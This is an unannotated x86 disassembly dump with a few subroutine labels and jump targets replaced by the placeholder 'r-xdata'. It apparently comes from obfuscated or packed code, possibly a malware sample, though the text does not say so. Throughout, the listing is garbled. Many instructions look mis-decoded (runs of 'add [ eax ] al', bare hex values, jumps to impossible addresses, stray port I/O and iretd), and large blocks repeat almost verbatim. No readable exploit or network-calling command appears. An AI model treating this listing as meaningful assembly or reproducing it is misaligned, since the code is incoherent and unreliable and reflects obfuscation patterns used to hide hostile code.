jne r-xdata
jne r-xdata
mov eax 0xfeef890f
jns r-xdata
sub eax 0x755a5858
mov ah 0x81
0x9c55
jge r-xdata
jpe 0x74cd340b
add esp 0x4
jae r-xdata
jl 0xf3a54c
pop ecx
jno r-xdata
mov ecx 0x15ff2d7f
jae r-xdata
or ecx 0xf18d0f
add [ eax ] al
push esp
push ebp
push edi
sub esp 0x4
call sub_402226
jae 0xffffffffff43aa4b
xor ecx 0x890fd079
or esi 0xff24810f
ja r-xdata
and eax 0x4c48358
pop eax
jg r-xdata
jge 0xffffffff894f7c45
jae r-xdata
sub ecx 0x92810f59
add [ eax ] al
add [ ecx - 0x7e39801d ] al
jecxz r-xdata
jns r-xdata
sub ebx 0xe8525452
insb
push eax
pushfd
add ebx 0xdc7f585a
pop ecx
jno r-xdata
and edi 0x800fae73
pop eax
pop ecx
jns r-xdata
ja r-xdata
jno 0xffffffffe89176e2
push 0x81ffffff
out 0x77 al
jne r-xdata
sub esp 0x28
pop ecx
pop edx
jne r-xdata
add [ esp + 0x64 ] r-xdata
sub ebx 0xff2f850f
jns 0x158a7a6
push edi
call sub_402478
jg 0xfffffffff0b37e9f
add edx 0xc381ea77
pop edx
pop eax
jg r-xdata
jno r-xdata
add esp 0x4
pop eax
jge r-xdata
jbe 0x133b322
pop edx
jg r-xdata
mov [ fs : 0x15ffe47d ] eax
pop ecx
ja r-xdata
xor eax 0xfef4870f
cmp edi 0xffffffff
inc [ ecx + 0x1a830ff3 ]
out dx eax
retn 0x810f
add [ eax ] al
add eax 0x4c4835a
jae r-xdata
jae r-xdata
jo 0x5866199b
ja r-xdata
add edi 0xff74830f
add [ eax ] al
jno 0xf9a7e75
jae r-xdata
mov [ fs : 0xffffffff8a0f6d71 ] eax
jno r-xdata
jae 0xffffffff84289cc1
jae r-xdata
call 0xffffffff854f7eaf
xor al 0xff
pop ecx
ja r-xdata
jge 0xffffffff9c95c150
jo 0xffffffffa2c13363
push ecx
push edx
call sub_402448
and edx 0x185e856
add [ eax ] al
jl 0xffffffffc1c157a5
push edx
call sub_4023e4
and esi 0xe981dd73
pushfd
push edi
pushfd
call sub_40245f
jo 0xff99a4c
jo 0xffffffff894f7e89
jae r-xdata
je 0xffffffffff6da893
jge r-xdata
les ecx [ eax ]
jge r-xdata
add ecx 0x870f5859
inc edi
add [ eax ] eax
add [ ecx - 0x7ef0a60a ] al
lodsb [ esi ]
pop edx
jne r-xdata
mov eax [ fs : 0xffffffffc9812675 ]
push esi
call sub_402422
and edi 0x850fc67f
pop ecx
pop eax
ja r-xdata
push ebp
pushfd
lea ecx [ edi ]
and [ eax - 0x1 ] 0xffffffff
dec [ edi ]
lea edx [ eax - 0x64 ]
insd
jne r-xdata
and edx 0x83519c54
in al dx
or al 0xe8
iretd
jae r-xdata
mov ebp 0x64f37759
mov eax [ 0xffffffffc9812675 ]
xor ecx 0x4ce85251
add [ eax ] al
add [ ecx - 0x7a17a91e ] al
add [ eax ] eax
add [ edi ] cl
sbb [ ecx + 0xf ] 0x81
mov [ 0xf000000 ] al
push esp
push eax
call sub_4024c8
xor edi 0x5f795958
jge r-xdata
add [ eax ] al
add [ edi ] cl
xchg [ edi - 0x30 ] bh
mov esp 0x11b8f0f
add [ eax ] al
sub ecx 0x8199755a
neg [ eax + 0x59 ]
jns r-xdata
xor esi 0xac810f59
jg 0xffffffffff53a9d3
push esp
pushfd
push ecx
sub esp 0xc
call sub_402445
mov [ fs : 0xffffffff870f5a59 ] eax
lodsd [ esi ]
add [ eax ] al
add [ esi + 0x790cc483 ] bh
iretd
or edi 0x80c481
add [ eax ] al
retn
sub_40221b
add esp 0x4
jae r-xdata
push ecx
push ebx
push ecx
call sub_402318
xor ebx 0xff1a830f
jo 0x5596797e
call sub_402309
add esi 0xa6830f
add [ eax ] al
add [ eax ] al
jae r-xdata
ja 0xffffffffa3c331b4
jae r-xdata
sub ecx 0xfeea830f
add [ eax ] al
add [ edi ] cl
test [ edi + 0x75 ] bh
add esp 0x8
jne r-xdata
add ebx 0xab810f
add [ eax ] al
xor al [ ecx ]
add [ eax ] al
jae r-xdata
mov ebp 0x478f0f5a
jae r-xdata
and esi 0x89641273
jg r-xdata
ja 0xffffffffff9ba471
pop eax
pop eax
pop edx
jne r-xdata
call 0xf48e6d4
lea eax [ ecx + 0x1 ]
add [ eax ] al
jg r-xdata
jpo 0xdea79a
jno r-xdata
and ebx 0x870f4975
jae r-xdata
or edx 0x54549c55
call sub_402380
jb 0xffffffff81b2a036
push ebp
pushfd
push esp
push esp
call [ 0xffffffffe9816c73 ]
add [ eax ] al
jae r-xdata
xor esi 0xe681cd75
jne r-xdata
mov [ fs : ebp + 0x19 ] esi
loope r-xdata
ja r-xdata
and ebx 0xe381c67f
jne r-xdata
pop ecx
pop ecx
jne r-xdata
jo 0x7ff92c12
add esp 0x4
jae r-xdata
jl 0xf3a54c
jg r-xdata
les eax [ edi + ecx ]
jae r-xdata
js 0x7548e7ce
jg r-xdata
ja 0xcaa5ca
pop ecx
pop ecx
jns r-xdata
add edx 0xc1870f58
sub eax 0x6c7315ff
pop eax
jg r-xdata
jge 0xffffffff894f7c45
pop edx
jge r-xdata
jo 0xffffffff854f7cc3
pop eax
jae r-xdata
and esi 0xc2817577
jno r-xdata
ja r-xdata
xor ecx 0x30870f59
add [ eax ] eax
add [ edi ] cl
xor [ ebx + 0x7a ] 0xffffffe8
add esp 0x8
or bh [ ebp + 0x478f0f5a ]
jno r-xdata
js 0x7f44e789
add [ eax ] al
add esi 0x83575554
in al dx
add al 0xe8
dec ecx
ja r-xdata
jno 0xffffffffe89176e2
push 0x81ffffff
out 0x77 al
jne r-xdata
pop edx
jg r-xdata
and [ edx + 0xf000000 ] 0xffffff8d
and ecx 0xf04c483
add esp 0x4
jg r-xdata
je 0xffffffff804f97e4
pop eax
ja r-xdata
xor edx 0x880f5e7f
jge r-xdata
add edx 0xbf810f
add [ eax ] al
jno r-xdata
call [ 0xfbf3f7f ]
lea ebx [ eax ]
sbb [ edi ] ecx
mov [ edi ] cs
pop ecx
ja r-xdata
xor eax 0xfef4870f
cmp edi 0xffffffff
inc [ ecx + 0x1a830ff3 ]
out dx eax
retn 0x810f
jae r-xdata
and edx 0xff53830f
add esp 0x4
ja r-xdata
jl 0xffffffffffacb21c
pop edx
pop edx
jne r-xdata
jne r-xdata
sub edi 0x64244481
xchg ebp eax
sub [ eax ] al
jne r-xdata
mov eax 0xfeef890f
jns r-xdata
sub eax 0x755a5858
mov ah 0x81
0x9c55
jno r-xdata
jae 0xffffffff84289cc1
pop ecx
jno r-xdata
mov ecx 0x15ff2d7f
jge r-xdata
jae r-xdata
or ecx 0xf18d0f
add [ eax ] al
pop eax
pop ecx
jne r-xdata
mov [ fs : edi ] ecx
test [ eax - 0x47000000 ] edi
jne r-xdata
push esp
push ebp
push edi
sub esp 0x4
call sub_402226
jae 0xffffffffff43aa4b
xor ecx 0x890fd079
or esi 0xff24810f
jae r-xdata
je 0xffffffffff6da893
jge r-xdata
les ecx [ eax ]
jae r-xdata
sub ecx 0x92810f59
add [ eax ] al
add [ ecx - 0x7e39801d ] al
jecxz r-xdata
jg r-xdata
sub edi 0xf681b871
jne r-xdata
jns r-xdata
sub ebx 0xe8525452
insb
ja r-xdata
sub ebx 0xec835656
adc al ch
jpe r-xdata
push esi
call sub_402589
xor esi 0x72870f59
add [ eax ] eax
add [ esp + edx * 2 + 0xd5e850 ] bh
add [ eax ] al
sub esp 0x28
pop ecx
pop edx
jne r-xdata
add [ esp + 0x64 ] r-xdata
sub ebx 0xff2f850f
push edx
push esp
push edx
call sub_40221b
sub ecx 0x850f5959
das
mov edi 0xff188d0f
jns 0x158a7a6
pop ecx
jno r-xdata
sub esi 0xf58595a
sub [ edi - 0x1 ] 0xffffffff
inc [ ecx - 0x70f0a53a ]
add [ eax ] 0x0
add [ ebx + 0x71 ] ah
insd
xchg [ edi ] cl
add [ eax ] al
add [ edi ] cl
add [ eax ] al
pop ecx
jno r-xdata
call 0xf44e9fd
and [ ecx - 0x2 ] 0xffffffff
inc [ ecx - 0x1b72f03e ]
pop ecx
jne r-xdata
jbe 0xffcf4c8
jno r-xdata
jge 0xffffffffffa0a807
jge r-xdata
jpe 0x74cd340b
ja r-xdata
and eax 0x4c48358
push eax
pushfd
add ebx 0xdc7f585a
pop ecx
jno r-xdata
and edi 0x800fae73
pop eax
pop ecx
jns r-xdata
push edi
call sub_402478
jg 0xfffffffff0b37e9f
add edx 0xc381ea77
pop edx
pop eax
jg r-xdata
jno r-xdata
add esp 0x4
pop eax
jge r-xdata
jbe 0x133b322
pop edx
jg r-xdata
mov [ fs : 0x15ffe47d ] eax
add eax 0x4c4835a
jae r-xdata
jae r-xdata
jo 0x5866199b
ja r-xdata
add edi 0xff74830f
add [ eax ] al
jno 0xf9a7e75
jae r-xdata
mov [ fs : 0xffffffff8a0f6d71 ] eax
jae r-xdata
call 0xffffffff854f7eaf
xor al 0xff
pop ecx
ja r-xdata
jge 0xffffffff9c95c150
jo 0xffffffffa2c13363
push ecx
push edx
call sub_402448
and edx 0x185e856
add [ eax ] al
jl 0xffffffffc1c157a5
push edx
call sub_4023e4
and esi 0xe981dd73
pushfd
push edi
pushfd
call sub_40245f
jo 0xff99a4c
jo 0xffffffff894f7e89
jge r-xdata
add ecx 0x870f5859
inc edi
add [ eax ] eax
add [ ecx - 0x7ef0a60a ] al
lodsb [ esi ]
pop edx
jne r-xdata
mov eax [ fs : 0xffffffffc9812675 ]
push esi
call sub_402422
and edi 0x850fc67f
pop ecx
pop eax
ja r-xdata
push ebp
pushfd
lea ecx [ edi ]
and [ eax - 0x1 ] 0xffffffff
dec [ edi ]
lea edx [ eax - 0x64 ]
insd
jne r-xdata
and edx 0x83519c54
in al dx
or al 0xe8
iretd
jae r-xdata
mov ebp 0x64f37759
mov eax [ 0xffffffffc9812675 ]
xor ecx 0x4ce85251
add [ eax ] al
add [ ecx - 0x7a17a91e ] al
add [ eax ] eax
add [ edi ] cl
sbb [ ecx + 0xf ] 0x81
mov [ 0xf000000 ] al
push esp
push eax
call sub_4024c8
xor edi 0x5f795958
jge r-xdata
add [ eax ] al
add [ edi ] cl
xchg [ edi - 0x30 ] bh
mov esp 0x11b8f0f
add [ eax ] al
sub ecx 0x8199755a
neg [ eax + 0x59 ]
jns r-xdata
xor esi 0xac810f59
jg 0xffffffffff53a9d3
push esp
pushfd
push ecx
sub esp 0xc
call sub_402445
mov [ fs : 0xffffffff870f5a59 ] eax
lodsd [ esi ]
add [ eax ] al
add [ esi + 0x790cc483 ] bh
iretd
or edi 0x80c481
add [ eax ] al
retn
sub_402226
push esp
push edi
push esi
push ebp
call sub_402309
add esi 0xa6830f
add [ eax ] al
add [ eax ] al
jae r-xdata
ja 0xffffffffa3c331b4
jae r-xdata
sub ecx 0xfeea830f
add [ eax ] al
add [ edi ] cl
test [ edi + 0x75 ] bh
add esp 0x8
jne r-xdata
add ebx 0xab810f
add [ eax ] al
xor al [ ecx ]
add [ eax ] al
jae r-xdata
mov ebp 0x478f0f5a
jae r-xdata
and esi 0x89641273
jg r-xdata
ja 0xffffffffff9ba471
pop eax
pop eax
pop edx
jne r-xdata
call 0xf48e6d4
lea eax [ ecx + 0x1 ]
add [ eax ] al
jg r-xdata
jpo 0xdea79a
jno r-xdata
and ebx 0x870f4975
jae r-xdata
or edx 0x54549c55
call sub_402380
jb 0xffffffff81b2a036
push ebp
pushfd
push esp
push esp
call [ 0xffffffffe9816c73 ]
add [ eax ] al
jae r-xdata
xor esi 0xe681cd75
jne r-xdata
mov [ fs : ebp + 0x19 ] esi
loope r-xdata
ja r-xdata
and ebx 0xe381c67f
jne r-xdata
pop ecx
pop ecx
jne r-xdata
jo 0x7ff92c12
add esp 0x4
jae r-xdata
jl 0xf3a54c
jg r-xdata
les eax [ edi + ecx ]
jae r-xdata
js 0x7548e7ce
jg r-xdata
ja 0xcaa5ca
pop ecx
pop ecx
jns r-xdata
add edx 0xc1870f58
sub eax 0x6c7315ff
pop eax
jg r-xdata
jge 0xffffffff894f7c45
pop edx
jge r-xdata
jo 0xffffffff854f7cc3
pop eax
jae r-xdata
and esi 0xc2817577
jno r-xdata
ja r-xdata
xor ecx 0x30870f59
add [ eax ] eax
add [ edi ] cl
xor [ ebx + 0x7a ] 0xffffffe8
add esp 0x8
or bh [ ebp + 0x478f0f5a ]
jno r-xdata
js 0x7f44e789
add [ eax ] al
add esi 0x83575554
in al dx
add al 0xe8
dec ecx
ja r-xdata
jno 0xffffffffe89176e2
push 0x81ffffff
out 0x77 al
jne r-xdata
pop edx
jg r-xdata
and [ edx + 0xf000000 ] 0xffffff8d
and ecx 0xf04c483
add esp 0x4
jg r-xdata
je 0xffffffff804f97e4
pop eax
ja r-xdata
xor edx 0x880f5e7f
jge r-xdata
add edx 0xbf810f
add [ eax ] al
jno r-xdata
call [ 0xfbf3f7f ]
lea ebx [ eax ]
sbb [ edi ] ecx
mov [ edi ] cs
pop ecx
ja r-xdata
xor eax 0xfef4870f
cmp edi 0xffffffff
inc [ ecx + 0x1a830ff3 ]
out dx eax
retn 0x810f
jae r-xdata
and edx 0xff53830f
add esp 0x4
ja r-xdata
jl 0xffffffffffacb21c
pop edx
pop edx
jne r-xdata
jne r-xdata
sub edi 0x64244481
xchg ebp eax
sub [ eax ] al
jne r-xdata
mov eax 0xfeef890f
jns r-xdata
sub eax 0x755a5858
mov ah 0x81
0x9c55
jno r-xdata
jae 0xffffffff84289cc1
pop ecx
jno r-xdata
mov ecx 0x15ff2d7f
jge r-xdata
jae r-xdata
or ecx 0xf18d0f
add [ eax ] al
pop eax
pop ecx
jne r-xdata
mov [ fs : edi ] ecx
test [ eax - 0x47000000 ] edi
jne r-xdata
push esp
push ebp
push edi
sub esp 0x4
call sub_402226
jae 0xffffffffff43aa4b
xor ecx 0x890fd079
or esi 0xff24810f
jae r-xdata
je 0xffffffffff6da893
jge r-xdata
les ecx [ eax ]
jae r-xdata
sub ecx 0x92810f59
add [ eax ] al
add [ ecx - 0x7e39801d ] al
jecxz r-xdata
jg r-xdata
sub edi 0xf681b871
jne r-xdata
jns r-xdata
sub ebx 0xe8525452
insb
ja r-xdata
sub ebx 0xec835656
adc al ch
jpe r-xdata
push esi
call sub_402589
xor esi 0x72870f59
add [ eax ] eax
add [ esp + edx * 2 + 0xd5e850 ] bh
add [ eax ] al
sub esp 0x28
pop ecx
pop edx
jne r-xdata
add [ esp + 0x64 ] r-xdata
sub ebx 0xff2f850f
push edx
push esp
push edx
call sub_40221b
sub ecx 0x850f5959
das
mov edi 0xff188d0f
jns 0x158a7a6
pop ecx
jno r-xdata
sub esi 0xf58595a
sub [ edi - 0x1 ] 0xffffffff
inc [ ecx - 0x70f0a53a ]
add [ eax ] 0x0
add [ ebx + 0x71 ] ah
insd
xchg [ edi ] cl
add [ eax ] al
add [ edi ] cl
add [ eax ] al
pop ecx
jno r-xdata
call 0xf44e9fd
and [ ecx - 0x2 ] 0xffffffff
inc [ ecx - 0x1b72f03e ]
pop ecx
jne r-xdata
jbe 0xffcf4c8
jno r-xdata
jge 0xffffffffffa0a807
jge r-xdata
jpe 0x74cd340b
ja r-xdata
and eax 0x4c48358
push eax
pushfd
add ebx 0xdc7f585a
pop ecx
jno r-xdata
and edi 0x800fae73
pop eax
pop ecx
jns r-xdata
push edi
call sub_402478
jg 0xfffffffff0b37e9f
add edx 0xc381ea77
pop edx
pop eax
jg r-xdata
jno r-xdata
add esp 0x4
pop eax
jge r-xdata
jbe 0x133b322
pop edx
jg r-xdata
mov [ fs : 0x15ffe47d ] eax
add eax 0x4c4835a
jae r-xdata
jae r-xdata
jo 0x5866199b
ja r-xdata
add edi 0xff74830f
add [ eax ] al
jno 0xf9a7e75
jae r-xdata
mov [ fs : 0xffffffff8a0f6d71 ] eax
jae r-xdata
call 0xffffffff854f7eaf
xor al 0xff
pop ecx
ja r-xdata
jge 0xffffffff9c95c150
jo 0xffffffffa2c13363
push ecx
push edx
call sub_402448
and edx 0x185e856
add [ eax ] al
jl 0xffffffffc1c157a5
push edx
call sub_4023e4
and esi 0xe981dd73
pushfd
push edi
pushfd
call sub_40245f
jo 0xff99a4c
jo 0xffffffff894f7e89
jge r-xdata
add ecx 0x870f5859
inc edi
add [ eax ] eax
add [ ecx - 0x7ef0a60a ] al
lodsb [ esi ]
pop edx
jne r-xdata
mov eax [ fs : 0xffffffffc9812675 ]
push esi
call sub_402422
and edi 0x850fc67f
pop ecx
pop eax
ja r-xdata
push ebp
pushfd
lea ecx [ edi ]
and [ eax - 0x1 ] 0xffffffff
dec [ edi ]
lea edx [ eax - 0x64 ]
insd
jne r-xdata
and edx 0x83519c54
in al dx
or al 0xe8
iretd
jae r-xdata
mov ebp 0x64f37759
mov eax [ 0xffffffffc9812675 ]
xor ecx 0x4ce85251
add [ eax ] al
add [ ecx - 0x7a17a91e ] al
add [ eax ] eax
add [ edi ] cl
sbb [ ecx + 0xf ] 0x81
mov [ 0xf000000 ] al
push esp
push eax
call sub_4024c8
xor edi 0x5f795958
jge r-xdata
add [ eax ] al
add [ edi ] cl
xchg [ edi - 0x30 ] bh
mov esp 0x11b8f0f
add [ eax ] al
sub ecx 0x8199755a
neg [ eax + 0x59 ]
jns r-xdata
xor esi 0xac810f59
jg 0xffffffffff53a9d3
push esp
pushfd
push ecx
sub esp 0xc
call sub_402445
mov [ fs : 0xffffffff870f5a59 ] eax
lodsd [ esi ]
add [ eax ] al
add [ esi + 0x790cc483 ] bh
iretd
or edi 0x80c481
add [ eax ] al
retn
sub_402309
jg r-xdata
jne r-xdata
and eax 0xae830f
add [ eax ] al
jae r-xdata
and esi 0x89641273
pop eax
pop eax
pop edx
jne r-xdata
call 0xf48e6d4
lea eax [ ecx + 0x1 ]
add [ eax ] al
jg r-xdata
jpo 0xdea79a
jae r-xdata
or edx 0x54549c55
add [ eax ] al
add [ edi ] cl
test [ edi + 0x75 ] bh
call sub_402380
jb 0xffffffff81b2a036
push ebp
pushfd
push esp
push esp
call [ 0xffffffffe9816c73 ]
add [ eax ] al
jne r-xdata
mov [ fs : ebp + 0x19 ] esi
loope r-xdata
xor al [ ecx ]
add [ eax ] al
ja r-xdata
and ebx 0xe381c67f
jne r-xdata
pop ecx
pop ecx
jne r-xdata
jo 0x7ff92c12
jg r-xdata
les eax [ edi + ecx ]
jae r-xdata
js 0x7548e7ce
jg r-xdata
ja 0xcaa5ca
pop ecx
pop ecx
jns r-xdata
add edx 0xc1870f58
sub eax 0x6c7315ff
pop edx
jge r-xdata
jo 0xffffffff854f7cc3
pop eax
jae r-xdata
and esi 0xc2817577
jno r-xdata
ja r-xdata
xor ecx 0x30870f59
add [ eax ] eax
add [ edi ] cl
xor [ ebx + 0x7a ] 0xffffffe8
add esp 0x8
or bh [ ebp + 0x478f0f5a ]
jno r-xdata
js 0x7f44e789
add [ eax ] al
add esi 0x83575554
in al dx
add al 0xe8
dec ecx
pop edx
jg r-xdata
and [ edx + 0xf000000 ] 0xffffff8d
and ecx 0xf04c483
add esp 0x4
jg r-xdata
je 0xffffffff804f97e4
pop eax
ja r-xdata
xor edx 0x880f5e7f
jge r-xdata
add edx 0xbf810f
add [ eax ] al
jae r-xdata
ja 0xffffffffa3c331b4
jno r-xdata
call [ 0xfbf3f7f ]
lea ebx [ eax ]
sbb [ edi ] ecx
mov [ edi ] cs
jae r-xdata
and edx 0xff53830f
add esp 0x4
ja r-xdata
jl 0xffffffffffacb21c
pop edx
pop edx
jne r-xdata
jne r-xdata
sub edi 0x64244481
xchg ebp eax
sub [ eax ] al
jne r-xdata
mov eax 0xfeef890f
jae r-xdata
sub ecx 0xfeea830f
jns r-xdata
sub eax 0x755a5858
mov ah 0x81
0x9c55
pop ecx
jno r-xdata
mov ecx 0x15ff2d7f
jge r-xdata
jae r-xdata
or ecx 0xf18d0f
add [ eax ] al
pop eax
pop ecx
jne r-xdata
mov [ fs : edi ] ecx
test [ eax - 0x47000000 ] edi
jne r-xdata
push esp
push ebp
push edi
sub esp 0x4
call sub_402226
jae 0xffffffffff43aa4b
xor ecx 0x890fd079
add esp 0x8
jne r-xdata
add ebx 0xab810f
add [ eax ] al
or esi 0xff24810f
jae r-xdata
sub ecx 0x92810f59
add [ eax ] al
add [ ecx - 0x7e39801d ] al
jecxz r-xdata
jg r-xdata
sub edi 0xf681b871
jns r-xdata
sub ebx 0xe8525452
insb
ja r-xdata
sub ebx 0xec835656
adc al ch
jpe r-xdata
push esi
call sub_402589
xor esi 0x72870f59
add [ eax ] eax
add [ esp + edx * 2 + 0xd5e850 ] bh
add [ eax ] al
jae r-xdata
mov ebp 0x478f0f5a
sub esp 0x28
pop ecx
pop edx
jne r-xdata
add [ esp + 0x64 ] r-xdata
sub ebx 0xff2f850f
push edx
push esp
push edx
call sub_40221b
sub ecx 0x850f5959
das
mov edi 0xff188d0f
jns 0x158a7a6
pop ecx
jno r-xdata
sub esi 0xf58595a
sub [ edi - 0x1 ] 0xffffffff
inc [ ecx - 0x70f0a53a ]
add [ eax ] 0x0
add [ ebx + 0x71 ] ah
insd
xchg [ edi ] cl
add [ eax ] al
add [ edi ] cl
jg r-xdata
ja 0xffffffffff9ba471
add [ eax ] al
pop ecx
jno r-xdata
call 0xf44e9fd
and [ ecx - 0x2 ] 0xffffffff
inc [ ecx - 0x1b72f03e ]
jno r-xdata
and ebx 0x870f4975
pop ecx
jne r-xdata
jbe 0xffcf4c8
jae r-xdata
xor esi 0xe681cd75
jno r-xdata
jge 0xffffffffffa0a807
add esp 0x4
jae r-xdata
jl 0xf3a54c
jge r-xdata
jpe 0x74cd340b
pop eax
jg r-xdata
jge 0xffffffff894f7c45
add [ eax ] al
ja r-xdata
and eax 0x4c48358
ja r-xdata
jno 0xffffffffe89176e2
push 0x81ffffff
out 0x77 al
jne r-xdata
push eax
pushfd
add ebx 0xdc7f585a
pop ecx
jno r-xdata
and edi 0x800fae73
pop eax
pop ecx
jns r-xdata
pop ecx
ja r-xdata
xor eax 0xfef4870f
cmp edi 0xffffffff
inc [ ecx + 0x1a830ff3 ]
out dx eax
retn 0x810f
push edi
call sub_402478
jg 0xfffffffff0b37e9f
add edx 0xc381ea77
pop edx
pop eax
jg r-xdata
jno r-xdata
add esp 0x4
pop eax
jge r-xdata
jbe 0x133b322
pop edx
jg r-xdata
mov [ fs : 0x15ffe47d ] eax
jno r-xdata
jae 0xffffffff84289cc1
add eax 0x4c4835a
jae r-xdata
jae r-xdata
jo 0x5866199b
ja r-xdata
add edi 0xff74830f
add [ eax ] al
jno 0xf9a7e75
jae r-xdata
mov [ fs : 0xffffffff8a0f6d71 ] eax
jae r-xdata
je 0xffffffffff6da893
jge r-xdata
les ecx [ eax ]
jae r-xdata
call 0xffffffff854f7eaf
xor al 0xff
pop ecx
ja r-xdata
jge 0xffffffff9c95c150
jo 0xffffffffa2c13363
push ecx
push edx
call sub_402448
and edx 0x185e856
add [ eax ] al
jl 0xffffffffc1c157a5
push edx
call sub_4023e4
and esi 0xe981dd73
pushfd
push edi
pushfd
call sub_40245f
jo 0xff99a4c
jo 0xffffffff894f7e89
jge r-xdata
add ecx 0x870f5859
inc edi
add [ eax ] eax
add [ ecx - 0x7ef0a60a ] al
lodsb [ esi ]
pop edx
jne r-xdata
mov eax [ fs : 0xffffffffc9812675 ]
push esi
call sub_402422
and edi 0x850fc67f
pop ecx
pop eax
ja r-xdata
push ebp
pushfd
lea ecx [ edi ]
and [ eax - 0x1 ] 0xffffffff
dec [ edi ]
lea edx [ eax - 0x64 ]
insd
jne r-xdata
and edx 0x83519c54
in al dx
or al 0xe8
iretd
jae r-xdata
mov ebp 0x64f37759
mov eax [ 0xffffffffc9812675 ]
xor ecx 0x4ce85251
add [ eax ] al
add [ ecx - 0x7a17a91e ] al
add [ eax ] eax
add [ edi ] cl
sbb [ ecx + 0xf ] 0x81
mov [ 0xf000000 ] al
push esp
push eax
call sub_4024c8
xor edi 0x5f795958
jge r-xdata
add [ eax ] al
add [ edi ] cl
xchg [ edi - 0x30 ] bh
mov esp 0x11b8f0f
add [ eax ] al
sub ecx 0x8199755a
neg [ eax + 0x59 ]
jns r-xdata
xor esi 0xac810f59
jg 0xffffffffff53a9d3
push esp
pushfd
push ecx
sub esp 0xc
call sub_402445
mov [ fs : 0xffffffff870f5a59 ] eax
lodsd [ esi ]
add [ eax ] al
add [ esi + 0x790cc483 ] bh
iretd
or edi 0x80c481
add [ eax ] al
retn
sub_402318
jne r-xdata
add esp 0x8
jg 0xf44e7a7
jae r-xdata
ja 0xffffffffa3c331b4
xchg [ esi - 0x1 ] eax
jae r-xdata
sub ecx 0xfeea830f
add [ eax ] al
add [ edi ] cl
test [ edi + 0x75 ] bh
add esp 0x8
jne r-xdata
add ebx 0xab810f
add [ eax ] al
xor al [ ecx ]
add [ eax ] al
jae r-xdata
mov ebp 0x478f0f5a
jae r-xdata
and esi 0x89641273
jg r-xdata
ja 0xffffffffff9ba471
pop eax
pop eax
pop edx
jne r-xdata
call 0xf48e6d4
lea eax [ ecx + 0x1 ]
add [ eax ] al
jg r-xdata
jpo 0xdea79a
jno r-xdata
and ebx 0x870f4975
jae r-xdata
or edx 0x54549c55
call sub_402380
jb 0xffffffff81b2a036
push ebp
pushfd
push esp
push esp
call [ 0xffffffffe9816c73 ]
add [ eax ] al
jae r-xdata
xor esi 0xe681cd75
jne r-xdata
mov [ fs : ebp + 0x19 ] esi
loope r-xdata
ja r-xdata
and ebx 0xe381c67f
jne r-xdata
pop ecx
pop ecx
jne r-xdata
jo 0x7ff92c12
add esp 0x4
jae r-xdata
jl 0xf3a54c
jg r-xdata
les eax [ edi + ecx ]
jae r-xdata
js 0x7548e7ce
jg r-xdata
ja 0xcaa5ca
pop ecx
pop ecx
jns r-xdata
add edx 0xc1870f58
sub eax 0x6c7315ff
pop eax
jg r-xdata
jge 0xffffffff894f7c45
add [ eax ] al
pop edx
jge r-xdata
jo 0xffffffff854f7cc3
pop eax
jae r-xdata
and esi 0xc2817577
jno r-xdata
ja r-xdata
xor ecx 0x30870f59
add [ eax ] eax
add [ edi ] cl
xor [ ebx + 0x7a ] 0xffffffe8
or bh [ ebp + 0x478f0f5a ]
jno r-xdata
js 0x7f44e789
add [ eax ] al
add esi 0x83575554
in al dx
add al 0xe8
dec ecx
ja r-xdata
jno 0xffffffffe89176e2
push 0x81ffffff
out 0x77 al
jne r-xdata
pop edx
jg r-xdata
and [ edx + 0xf000000 ] 0xffffff8d
and ecx 0xf04c483
add esp 0x4
jg r-xdata
je 0xffffffff804f97e4
pop eax
ja r-xdata
xor edx 0x880f5e7f
jge r-xdata
add edx 0xbf810f
add [ eax ] al
jno r-xdata
call [ 0xfbf3f7f ]
lea ebx [ eax ]
sbb [ edi ] ecx
mov [ edi ] cs
pop ecx
ja r-xdata
xor eax 0xfef4870f
cmp edi 0xffffffff
inc [ ecx + 0x1a830ff3 ]
out dx eax
retn 0x810f
jae r-xdata
and edx 0xff53830f
add esp 0x4
ja r-xdata
jl 0xffffffffffacb21c
pop edx
pop edx
jne r-xdata
jne r-xdata
sub edi 0x64244481
xchg ebp eax
sub [ eax ] al
jne r-xdata
mov eax 0xfeef890f
jns r-xdata
sub eax 0x755a5858
mov ah 0x81
0x9c55
jno r-xdata
jae 0xffffffff84289cc1
pop ecx
jno r-xdata
mov ecx 0x15ff2d7f
jge r-xdata
jae r-xdata
or ecx 0xf18d0f
add [ eax ] al
pop eax
pop ecx
jne r-xdata
mov [ fs : edi ] ecx
test [ eax - 0x47000000 ] edi
jne r-xdata
push esp
push ebp
push edi
sub esp 0x4
call sub_402226
jae 0xffffffffff43aa4b
xor ecx 0x890fd079
or esi 0xff24810f
jae r-xdata
je 0xffffffffff6da893
jge r-xdata
les ecx [ eax ]
jae r-xdata
sub ecx 0x92810f59
add [ eax ] al
add [ ecx - 0x7e39801d ] al
jecxz r-xdata
jg r-xdata
sub edi 0xf681b871
jne r-xdata
jns r-xdata
sub ebx 0xe8525452
insb
ja r-xdata
sub ebx 0xec835656
adc al ch
jpe r-xdata
push esi
call sub_402589
xor esi 0x72870f59
add [ eax ] eax
add [ esp + edx * 2 + 0xd5e850 ] bh
add [ eax ] al
sub esp 0x28
pop ecx
pop edx
jne r-xdata
add [ esp + 0x64 ] r-xdata
sub ebx 0xff2f850f
push edx
push esp
push edx
call sub_40221b
sub ecx 0x850f5959
das
mov edi 0xff188d0f
jns 0x158a7a6
pop ecx
jno r-xdata
sub esi 0xf58595a
sub [ edi - 0x1 ] 0xffffffff
inc [ ecx - 0x70f0a53a ]
add [ eax ] 0x0
add [ ebx + 0x71 ] ah
insd
xchg [ edi ] cl
add [ eax ] al
add [ edi ] cl
add [ eax ] al
pop ecx
jno r-xdata
call 0xf44e9fd
and [ ecx - 0x2 ] 0xffffffff
inc [ ecx - 0x1b72f03e ]
pop ecx
jne r-xdata
jbe 0xffcf4c8
jno r-xdata
jge 0xffffffffffa0a807
jge r-xdata
jpe 0x74cd340b
ja r-xdata
and eax 0x4c48358
push eax
pushfd
add ebx 0xdc7f585a
pop ecx
jno r-xdata
and edi 0x800fae73
pop eax
pop ecx
jns r-xdata
push edi
call sub_402478
jg 0xfffffffff0b37e9f
add edx 0xc381ea77
pop edx
pop eax
jg r-xdata
jno r-xdata
add esp 0x4
pop eax
jge r-xdata
jbe 0x133b322
pop edx
jg r-xdata
mov [ fs : 0x15ffe47d ] eax
add eax 0x4c4835a
jae r-xdata
jae r-xdata
jo 0x5866199b
ja r-xdata
add edi 0xff74830f
add [ eax ] al
jno 0xf9a7e75
jae r-xdata
mov [ fs : 0xffffffff8a0f6d71 ] eax
jae r-xdata
call 0xffffffff854f7eaf
xor al 0xff
pop ecx
ja r-xdata
